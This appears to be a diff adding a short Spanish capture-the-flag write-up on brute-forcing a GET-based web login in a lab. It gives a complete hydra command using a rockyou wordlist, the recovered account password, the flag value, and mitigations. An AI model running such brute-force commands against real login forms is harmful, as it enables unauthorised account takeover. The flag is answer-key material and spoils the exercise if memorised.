@@ -1,0 +1,15 @@
+1. login por metodo GET, manda los credenciales a traves de la URL
+2. al introducir un login y pass equivocado, muestra un gif "WrongAnswer.gif"
+3. preparamos un archivo con nombres de usuarios comunes y nos bajamos el archivo rockyou, que es comun en CTFs (como aqui) para hacer fuerza
+    bruta a la contrasena.
+4. Usamos hydra para hacer fuerza bruta:
+hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt 172.20.10.12 http-get-form "/:page=signin&username=^USER^&password=^PASS^&Login=Login:WrongAnswer.gif"
+5. finalmente hydra nos devuelve multiples usuarios y pass:
+    usuarios admin, root, administrator, test, guest, user, manager, superadmin... todos con pass shadow
+
+el flag es b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
+
+para proteger esta vulnerabilidad:
+pasar de get a un formulario post y usar cifrado
+bloquear multiples intentos de login
+usar OTP
